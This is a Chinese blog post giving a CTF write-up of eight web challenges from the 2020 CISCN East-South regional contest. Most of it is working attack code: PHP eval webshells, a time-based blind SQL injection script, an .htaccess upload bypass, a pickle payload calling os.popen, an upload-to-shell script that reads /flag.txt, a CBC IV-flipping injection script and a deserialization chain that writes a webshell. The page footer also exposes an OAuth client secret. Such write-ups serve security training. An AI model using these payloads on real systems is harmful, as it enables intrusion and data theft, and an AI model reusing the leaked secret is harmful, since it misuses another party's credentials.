<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>2020 ciscn 华东南 web | oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="2020 CISCN 华东南赛区web1zip -r is useful, and don&#39;t forget &#x2F;var&#x2F;www&#x2F;html&#x2F;***********&#x2F;cat.php访问www.zip拿到源码 利用$msg &#x3D; sprintf($msg, $value);打印文件上传位置me0w_mE0w_miA0 访问me0w_mE0w_miA0&#x2F;cat.php提示vim,拿到源码 cat.p">
<meta property="og:type" content="article">
<meta property="og:title" content="2020 ciscn 华东南 web">
<meta property="og:url" content="http://blog.ccreater.top/2020/10/04/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:description" content="2020 CISCN 华东南赛区web1zip -r is useful, and don&#39;t forget &#x2F;var&#x2F;www&#x2F;html&#x2F;***********&#x2F;cat.php访问www.zip拿到源码 利用$msg &#x3D; sprintf($msg, $value);打印文件上传位置me0w_mE0w_miA0 访问me0w_mE0w_miA0&#x2F;cat.php提示vim,拿到源码 cat.p">
<meta property="og:locale" content="zh">
<meta property="og:image" content="https://image.3001.net/images/20180228/15198072135832.png!small">
<meta property="article:published_time" content="2020-10-04T14:03:28.239Z">
<meta property="article:modified_time" content="2020-10-04T14:03:28.239Z">
<meta property="article:author" content="ccreater">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="web">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://image.3001.net/images/20180228/15198072135832.png!small">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.ccreater.top"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-2020 ciscn 华东南 web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/10/04/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/" class="article-date">
  <time class="dt-published" datetime="2020-10-04T14:03:28.239Z" itemprop="datePublished">2020-10-04</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      2020 ciscn 华东南 web
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020-CISCN-华东南赛区"><a href="#2020-CISCN-华东南赛区" class="headerlink" title="2020 CISCN 华东南赛区"></a>2020 CISCN 华东南赛区</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><pre><code>zip -r is useful, and don&#39;t forget /var/www/html/***********/cat.php</code></pre><p>访问<a href="http://www.zip拿到源码" target="_blank" rel="noopener">www.zip拿到源码</a></p>
<p>利用<code>$msg = sprintf($msg, $value);</code>打印文件上传位置<code>me0w_mE0w_miA0</code></p>
<p>访问<code>me0w_mE0w_miA0/cat.php</code>提示vim,拿到源码</p>
<p>cat.php</p>
<pre><code class="php">&lt;?php
error_reporting(0);
include(&#39;../waf.php&#39;);

session_start();
/*Login check*/
if(!$_SESSION[&#39;islogin&#39;])
{
    die(&#39;Who are you?&#39;);

}else{
    //class is waf~
    echo &quot;&lt;h4 align=&#39;center&#39;&gt;Hello,ctfer&lt;/h4&gt;&quot;;
    echo &quot;&lt;h4 align=&#39;center&#39;&gt;But I am only a little cat......really?&lt;/h4&gt;&quot;;
    echo &#39;&lt;br&gt;&lt;div align=&quot;center&quot;&gt;&lt;img src=&quot;../images/cat2.jpg&quot; align=&quot;center&quot; /&gt;&lt;/div&gt;&lt;/br&gt;&#39;;
    $a=new waf();
    spl_autoload_register();

    if(isset($_COOKIE[&quot;filenames&quot;]))
    {
        $a-&gt;data=$_COOKIE[&quot;filenames&quot;];
        $a-&gt;upload_check();
        echo &quot;&lt;h3 align=&#39;center&#39;&gt;The Winning Formula is complete!&lt;/h3&gt;&quot;;
        $filenames=unserialize($_COOKIE[&quot;filenames&quot;]);
    }else{
        $filenames=&#39;kee1ongz.meow&#39;;
        file_put_contents($filenames,&#39; Meow~meow,meow~&#39;);
    }
}

?&gt;
</code></pre>
<p>spl_autoload_register();没有任何参数的情况下调用spl_autoload();</p>
<blockquote>
<ul>
<li><code>class_name</code></li>
</ul>
<ul>
<li><code>file_extensions</code></li>
</ul>
<p>在默认情况下，本函数先将类名转换成小写，再在小写的类名后加上 .inc       或 .php 的扩展名作为文件名，然后在所有的包含路径(include paths)中检查是否存在该文件。 </p>
</blockquote>
<p>上传fffffffffffuck.inc</p>
<pre><code>&lt;?php 
    class fffffffffffuck{
        public function __wakeup(){
            eval($_POST[1]);
        }
    }</code></pre><p>反序列化:<code>O:13:&quot;ffffffffffuck&quot;:0:[]</code>，将{}换为:<code>[]</code>虽然反序列化失败，但是还是调用了<code>__wakeup</code></p>
<p>拿到flag:<code>ciscn{keQXj78JHVUKjssqgD}</code></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>提示source.php,composer</p>
<pre><code class="php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
    if($_SERVER[&#39;REMOTE_ADDR&#39;] === &#39;127.0.0.1&#39;){
        $content = file_get_contents(&#39;php://filter/read=convert.base64-encode/resource=file:///var/www/html/excel.php&#39;);
        file_get_contents(&#39;http://&#39;.$_GET[&#39;ip&#39;].&#39;/?&#39;.$content);
    }
    else{
        die(&#39;only for localhost&#39;);
    }
?&gt;</code></pre>
<p>composer.json</p>
<pre><code>{
    &quot;require&quot;: {
        &quot;phpoffice/phpspreadsheet&quot;: &quot;1.5.0&quot;
    }
}</code></pre><p>hint给你excel.php的源码</p>
<pre><code class="php">&lt;?php
error_reporting(0);
require &#39;vendor/autoload.php&#39;;
$r = \PhpOffice\PhpSpreadsheet\IOFactory::createReader(&#39;Xlsx&#39;);
$r-&gt;setReadDataOnly(TRUE);
$fileInfo = $_FILES[&quot;filename&quot;];
$filePath = $fileInfo[&quot;tmp_name&quot;];
try {
$data = $r-&gt;load($filePath)-&gt;getSheet(0)-&gt;toArray(); 
}
catch (Exception $e) {
die(&#39;illegal xlsx file!&#39;);
}
$s = &#39;&#39;;
$s = $s.&#39;&lt;table&gt;&#39;;
foreach($data as $a)
    {
    $s = $s.&#39;&lt;tr&gt;&#39;;
    foreach($a as $i)
    {
        $s = $s.&quot;&lt;td style=\&quot;text-align:center\&quot;&gt;&lt;h2&gt;&quot;.$i.&quot;&lt;/h2&gt;&lt;/td&gt;&quot;;
    }
    $s = $s.&#39;&lt;/tr&gt;&#39;;
    }
$s = $s.&#39;&lt;/table&gt;&#39;;
stream_wrapper_unregister(&#39;php&#39;);
chdir(&#39;users/&#39;);
$fd = (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])?$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]:$_SERVER[&#39;REMOTE_ADDR&#39;]);
mkdir($fd);
//data:
chdir($fd);
file_put_contents(&#39;profile&#39;,$s);
$f = basename(getcwd()).&#39;/profile&#39;;
//data:,/profile
chdir(&#39;..&#39;);
if(!stripos(file_get_contents($f),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($f),&#39;php&#39;)) {
    include($f);
}
else die(&#39;no!&#39;);
?&gt;

</code></pre>
<p>file_get_contents在处理data:,xxxxxx时会直接取xxxxxx<br>而include会包含文件名为data:,xxxxxx的文件</p>
<p>但是我们无法直接创建<code>data:</code>的文件夹</p>
<p>先用<code>./data:</code>创建<code>data:</code>文件夹</p>
<p>再用<code>data:</code>来绕过<code>if(!stripos(file_get_contents($f),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($f),&#39;php&#39;))</code></p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><a href="http://www.zip直接下载，翻源码审计。" target="_blank" rel="noopener">www.zip直接下载，翻源码审计。</a></p>
<p>登录这边看这login.php构造一下符合正则规则的参数就好了，登了取下sessionid</p>
<p>然后qr.php里，sql注入明显的点，直接拼接的，<code>$data</code>来自于扫描二维码得到的数据，二维码里是个json：<code>{&quot;id&quot;:&quot;xxxx&quot;}</code>。</p>
<pre><code class="php">$sql=&quot;insert into record(p_id, userid)values (&#39;&quot;.$data[&#39;id&#39;].&quot;&#39;,&#39;&quot;.$user-&gt;getCardID().&quot;&#39;);&quot;;</code></pre>
<p>写盲注脚本爆破一下：</p>
<pre><code class="python">import requests, time
import qrcode
from requests.adapters import HTTPAdapter

SQL = &quot;(select group_concat(flag) from flag)&quot;
GETCONTENT = &quot;&#39;or(if( ascii(substr((&quot; + SQL + &quot;),%d,1)) &lt;= %d, sleep(5), 0))or&#39;&quot;
GETLENGTH = &quot;&#39;or(if( length((&quot; + SQL + &quot;)) &lt;= %d, sleep(5), 0))or&#39;&quot;

THRESHOLD = 5
STRLEN = 32

session = requests.Session()

session.mount(&#39;http://&#39;, HTTPAdapter(max_retries=10))


def guess(payload, strpos=None):
    l = 0
    r = 255

    while l &lt; r:
        mid = (l+r)//2
        if strpos is None:
            sql = payload % (mid)
        else:
            sql = payload % (strpos, mid)

        if check(sql) == True:
            r = mid
            print(&#39;guess &lt;=&#39;, r)
        else:
            l = mid + 1
            print(&#39;guess &gt;&#39;, l)
    return l


def check(payload):

    qr = qrcode.make(&#39;{&quot;id&quot;:&quot;&#39; + payload + &#39;&quot;}&#39;)
    qr.save(&#39;qr.png&#39;)
    start = time.perf_counter()
    x = session.post(
        url=&#39;http://172.20.6.103/qr.php&#39;,
        cookies={
            &#39;PHPSESSID&#39;: &#39;fe940a8329992285f77487f96c575d29&#39;
        },
        files={
            &quot;file&quot;: open(&quot;qr.png&quot;, &quot;rb&quot;),
            &quot;Content-Type&quot;: &quot;application/octet-stream&quot;,
            &quot;Content-Disposition&quot;: &quot;form-data&quot;,
            &quot;filename&quot;: &quot;qr.png&quot;
        },
        timeout=(2, 8)
    )
    end = time.perf_counter()
    print(payload, end-start)
    if end-start &gt; THRESHOLD:
        return True
    else:
        return False


def getlength():
    global STRLEN
    STRLEN = guess(GETLENGTH)
    print(&#39;LEN:&#39;, STRLEN)


def getcontent():
    content = &#39;&#39;
    for strpos in range(1, STRLEN+1):
        ch = guess(GETCONTENT, strpos)

        content += chr(ch)
        print(&#39;CHR:&#39;, chr(ch), &#39;CONTENT:&#39;, content)


if __name__ == &#39;__main__&#39;:
    getlength()
    getcontent()</code></pre>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><pre><code>&lt;?php
class GetPass
{}
class Upload
{}
$y1ng = new GetPass;
$y1ng-&gt;abandon = new GetPass;
$y1ng-&gt;abandon-&gt;abandon =new Upload;
$y1ng-&gt;abandon-&gt;boring =&quot;1&quot;;
$y1ng-&gt;abandon-&gt;code =&quot;1&quot;;

$y1ng-&gt;boring = &#39;read&#39;;
$y1ng-&gt;code = &#39;hidden&#39;;

$c = new GetPass;
$c-&gt;abandon = new GetPass;
$c-&gt;abandon-&gt;abandon =new Upload;
$c-&gt;abandon-&gt;boring =&quot;1&quot;;
$c-&gt;abandon-&gt;code =&quot;1&quot;;

$c-&gt;boring = &#39;read&#39;;
$c-&gt;code = this;

$ser = serialize([$y1ng,$c]);
var_dump(urlencode($ser));</code></pre><p>拿到pass=ob_end_clean_is_surplus</p>
<p>文件上传与网上某题相近</p>
<p>exp.py</p>
<pre><code class="python">SIZE_HEADER = b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;

def generate_php_file(filename, script):
    phpfile = open(filename, &#39;wb&#39;) 

    phpfile.write(script.encode(&#39;utf-16be&#39;))
    phpfile.write(SIZE_HEADER)

    phpfile.close()

def generate_htacess():
    htaccess = open(&#39;.htaccess&#39;, &#39;wb&#39;)

    htaccess.write(SIZE_HEADER)
    htaccess.write(b&#39;AddType application/x-httpd-php .fuck\n&#39;)
    htaccess.write(b&#39;php_value zend.multibyte 1\n&#39;)
    htaccess.write(b&#39;php_value zend.detect_unicode 1\n&#39;)
    htaccess.write(b&#39;php_value display_errors 1\n&#39;)

    htaccess.close()
generate_htacess()
generate_php_file(&quot;webshell.fuck&quot;, &quot;&lt;?php eval($_POST[1]); ?&gt;&quot;)
</code></pre>
<p>分别上传webshell.fuck,还有.htaccess拿到flag</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><pre><code>ccopy_reg
_reconstructor
p0
(c__main__
webSite
p1
c__builtin__
object
p2
Ntp3
Rp4
(dp5
Vname
p6
c__builtin__
getattr
(cos
popen
(S&#39;dir&#39;
tRS&#39;read&#39;
tR(NtRp7
sVdescribe
p8
V2
p9
sb.</code></pre><p>提权没环境复现</p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><pre><code class="python">import requests
url=&quot;http://172.20.6.106:80/&quot;
burp0_url = &quot;http://172.20.6.106:80/index.php&quot;
burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://172.20.6.106&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundary6ssqFd6DiMBBDuHJ&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://172.20.6.106/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;x-forwarded-for&quot;: &quot;127.0.0.1&quot;, &quot;Connection&quot;: &quot;close&quot;}
burp0_data = &quot;------WebKitFormBoundary6ssqFd6DiMBBDuHJ\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;htaccess\&quot;\r\nContent-Type: application/octet-stream\r\n\r\nSetHandler application/x-httpd-php\r\n------WebKitFormBoundary6ssqFd6DiMBBDuHJ\r\nContent-Disposition: form-data; name=\&quot;name\&quot;\r\n\r\n.htaccess\r\n------WebKitFormBoundary6ssqFd6DiMBBDuHJ--\r\n&quot;
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)


burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Origin&quot;: &quot;http://172.20.6.106&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundarywAeLpgB3HhSWqVLj&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://172.20.6.106/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;x-forwarded-for&quot;: &quot;127.0.0.1&quot;, &quot;Connection&quot;: &quot;close&quot;}
burp0_data = &quot;------WebKitFormBoundarywAeLpgB3HhSWqVLj\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;shell1.jpg\&quot;\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php\neval($_POST[&#39;a&#39;]);\n?&gt;\r\n------WebKitFormBoundarywAeLpgB3HhSWqVLj\r\nContent-Disposition: form-data; name=\&quot;name\&quot;\r\n\r\n2.jpg\r\n------WebKitFormBoundarywAeLpgB3HhSWqVLj--\r\n&quot;
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)


burp0_data={&quot;a&quot;:&quot;system(&#39;cat /flag.txt&#39;);&quot;}
r=requests.post(url+&quot;upload/2.jpg&quot;, data=burp0_data)
print(r.text)</code></pre>
<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>浏览一遍代码后发现一个弱类型比较</p>
<pre><code class="php">function getUser()
{

    if (!isset($_SESSION[&quot;token&quot;])) {
        return -1;  //not login
    } else if ($_SESSION[&quot;token&quot;] == &quot;0&quot;) {
        return 0;   //Administrator//0e绕过
    } else {
        $key = base64_decode($_SESSION[&quot;token&quot;]);
        $user = explode(&quot;|&quot;, $key)[0]; //user
        if (!$user) {
            return -1;
        }
        return $user;
    }
}
</code></pre>
<p>如果我们能令token以0e[0-9]+的格式的话，就可以绕过身份验证机制</p>
<p>而生成token的代码为：</p>
<pre><code class="php">function setUser($username, $password)
{
    $ip = $_SERVER[&quot;REMOTE_ADDR&quot;];
    if ($username == &#39;admin&#39;) {
        if ($ip == &quot;::1&quot; || $ip == &quot;127.0.0.1&quot;){
            $_SESSION[&quot;token&quot;] = 0;     //Administrator
        }else{
            die(&#39;修罗！隐忍！！！&#39;);
        }
    } else {
        $key = $username . &quot;|&quot; . $password;
        $_SESSION[&quot;token&quot;] = base64_encode($key);
    }
}</code></pre>
<p>因为0e[0-9]+是在base64中的所以我们构造：<code>username=%D1%EDv%EF%BE&amp;password=%D7m%F8</code></p>
<p>至此获得admin权限</p>
<p>upload处有个任意文件上传，但是我们不知道admin的上传目录，我们不得不进行sql注入</p>
<p>notes.php处有个神奇的todo:</p>
<pre><code class="php">if (isset($_POST[&#39;contents&#39;])) {
    $data = getCache();
    if ($data &amp;&amp; $data-&gt;contents == $_POST[&#39;contents&#39;]) {
        $username = $data-&gt;username;
        $contents = $data-&gt;contents;

    } else {
        $contents = $_POST[&#39;contents&#39;];
    }
    if (isset($_POST[&#39;cache&#39;])) {
        setCache($username, $contents);
        echo &quot;&lt;script&gt;alert(&#39;缓存成功&#39;);location.href=&#39;index.php&#39;&lt;/script&gt;&quot;;
    } else {
        setcookie(&#39;cache&#39;);
        $sql = &quot;INSERT INTO notes (uid, contents, time) VALUES ((select id from users where username = &#39;${username}&#39;), &#39;${contents}&#39;, localtime())&quot;;
        echo $sql;
        if ($conn-&gt;query($sql) === TRUE) {
            echo &quot;&lt;script&gt;alert(&#39;提交成功&#39;);location.href=&#39;index.php&#39;&lt;/script&gt;&quot;;
        } else {
            echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;
            //TODO:删掉
        }
    }
}</code></pre>
<p>如果我们能控制$data-&gt;contents == $_POST[‘contents’]，且可以控制<code>$data-&gt;username</code>出现引号逃出引号的包围，就可以进行sql注入了。</p>
<p>而我们的缓存的加密函数是：</p>
<pre><code class="php">class CBCCrypt {
    private $iv;

    private $encryptKey;

    public function __construct()
    {
        $this-&gt;iv = &quot;cbcisfunsoisbase&quot;;
        $this-&gt;encryptKey =  file_get_contents(&quot;secret.txt&quot;);
    }

    public function encrypt($encryptStr) {
        $iv = $this-&gt;iv;
        $encryptKey = $this-&gt;encryptKey;

        $encrypted=openssl_encrypt($encryptStr, &#39;aes-128-cbc&#39;, $encryptKey, true, $iv);

        return base64_encode($iv.$encrypted);

    }

    public function decrypt($encryptStr) {
        $iv = substr(base64_decode($encryptStr),0,16);
        $encryptKey = $this-&gt;encryptKey;
        $encrypted = substr(base64_decode($encryptStr),16);
        $decrypted = openssl_decrypt($encrypted, &#39;aes-128-cbc&#39;, $encryptKey, true, $iv);
        echo openssl_error_string();

        return $decrypted;
    }
}</code></pre>
<p>其中$iv是受到我们控制的</p>
<p><img src="https://image.3001.net/images/20180228/15198072135832.png!small" alt="image12048"></p>
<p>根据cbc加密的原理我们可以知道，通过修改iv从而修改初始的16个字符串</p>
<p>爆破合适iv的脚本:</p>
<pre><code class="php">&lt;?php

function strxor($str1,$str2){
    $res=&quot;&quot;;
    if(strlen($str1)!==strlen($str2))
        return &quot;&quot;;
    for($i=0;$i&lt;strlen($str1);$i++){
        $res.=chr(ord($str1[$i])^ord($str2[$i]));
    }
    return $res;

}
$enc=urldecode(&quot;Y2JjaXNmdW5zb2lzYmFzZUDBRfKeIBJYWfSM2WOSqNOLdJ7UM1Nq%2B9zuKSrAr7O8%2B9AtpndZ00OlTIF0qmDsWw%3D%3D&quot;);
$cipher = substr($enc,16,16);
$message = substr(&#39;{&quot;username&quot;:&quot;fucker&quot;,&quot;contents&quot;:&quot;fucker&quot;}&#39;,0,16);
$iv = &quot;cbcisfunsoisbase&quot;;
$before_xor=strxor($message,$iv);
for($i=0;$i&lt;256;$i++){
    $iv = &quot;cbcisfunsoisbas&quot;.chr($i);
    $result = strxor($iv,$before_xor);
    if(strpos($result,&quot;&#39;&quot;)!==FALSE){
        echo urlencode($iv);
        echo &quot;\n&quot;.$result;
    }
}</code></pre>
<pre><code class="python">import requests
import base64
import urllib
import random
session = requests.session()


def reg(session,username):
    burp0_url = &quot;http://100.100.1.5:80/ctf/register.php&quot;
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://100.100.1.5&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://100.100.1.5/ctf/register.html&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    burp0_data = {&quot;username&quot;: &quot;fuc&quot;+username, &quot;password&quot;: &quot;fucker&quot;, &quot;submit&quot;: &quot;\xe6\xb3\xa8\xe5\x86\x8c&quot;}
    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    if &quot;注册成功&quot; in r.text:
        return True
    else:
        return False

def cache(session):
    burp0_url = &quot;http://100.100.1.5:80/ctf/notes.php&quot;
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://100.100.1.5&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://100.100.1.5/ctf/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    burp0_data = {&quot;contents&quot;: &quot;fffffffffffffffffffffffffffffffffff&quot;, &quot;cache&quot;: &#39;&#39;}
    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    if &quot;缓存成功&quot; in r.text:
        return True
    return False

def submit(session,cookies):
    burp0_url = &quot;http://100.100.1.5:80/ctf/notes.php&quot;
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://100.100.1.5&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://100.100.1.5/ctf/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    burp0_data = {&quot;contents&quot;: &quot;fffffffffffffffffffffffffffffffffff&quot;, &quot;submit&quot;: &#39;&#39;}
    session.cookies = requests.utils.cookiejar_from_dict(cookies, cookiejar=None, overwrite=True)
    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data,cookies=cookies)
    return r
def sqlinj(sql):
    reg(session,sql)
    cache(session)
    cookie = session.cookies.get_dict()
    cookie[&quot;cache&quot;]=urllib.parse.quote_plus(str(base64.b64encode(b&quot;cbcisfunsoisbas\x21&quot;+base64.b64decode(urllib.parse.unquote(cookie[&quot;cache&quot;]))[16:]),encoding=&quot;ascii&quot;))
    print(cookie)
    r=submit(session,cookie)
    return r
sql=&quot;or(updatexml(1,concat(0x7e,(select upload from users where username=0x61646D696E),0x7e),1))),0x666666666666,localtime())#dd&quot;
r=sqlinj(sql)
print(r.text)
if &quot;提交成功&quot; not in r.text:
    print(r.text)</code></pre>
<p>上传名为file的文件，得到config/admin/secretpath/profile</p>
<p>结合<code>include &quot;config/${_SESSION[&#39;token&#39;]}/profile&quot;;</code>从而getshell</p>
<p>token是base64编码，因此可以精心构造出admin/secretpath</p>
<p>由于没有题目环境便无法验证</p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>网络上找到了一个payload:<a href="http://igml.top/2020/08/21/2020-ciscn/" target="_blank" rel="noopener">http://igml.top/2020/08/21/2020-ciscn/</a></p>
<pre><code class="php">&lt;?php

namespace DB\Jig {
    class Mapper
    {
        protected $db;
        protected $file = &#39;gmmml.php&#39;;
        protected $document = &#39;&lt;?php @eval($_POST[gml]);?&gt;&#39;;

        function __construct($db)
        {
            $this-&gt;db = $db;
        }
    }
}

namespace DB {
    class Jig
    {
        protected $format = 0;
        protected $dir = &#39;./&#39;;
    }
}

namespace CLI {
    class Agent
    {
        protected $server;

        function __construct($server)
        {
            $this-&gt;server = $server;
        }
    }

    class WS
    {
        protected $events;

        function __construct($events)
        {
            $this-&gt;events = $events;
        }
    }
}

namespace {
    class F3
    {
        public $events;

        function __construct($events)
        {
            $this-&gt;events = $events;
        }
    }

    $a = new DB\Jig();
    $b = new DB\Jig\Mapper($a);
    $c = new F3(array(&#39;disconnect&#39; =&gt; array($b, &quot;insert&quot;)));
    $d = new CLI\Agent($c);
    $e = new CLI\WS($d);
    echo urlencode(serialize($e));

}</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/10/04/2020">http://blog.ccreater.top/2020/10/04/2020</a> ciscn 华东南 web/](<a href="http://blog.ccreater.top/2020/10/04/2020">http://blog.ccreater.top/2020/10/04/2020</a> ciscn 华东南 web/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/10/04/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/" data-id="ckfv6e8cl0000wsvddks489zy" data-title="2020 ciscn 华东南 web" class="article-share-link">Share</a>
      
	  
			  
				  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
  <script src="/js/md5.min.js"></script>
<div id="gitalk-container"></div>
<script type="text/javascript">
    var gitalk = new Gitalk({
        clientID: '3fd4b7c51e3cfe6d1f43',
        clientSecret: 'e3b1162bfd0bc86431672a764a8c801b4dc97929',
        id: md5(window.location.pathname),
        repo: 'Explorersss.github.io',
        owner: 'Explorersss',
        admin: 'Explorersss',
        distractionFreeMode: 'true'
    })
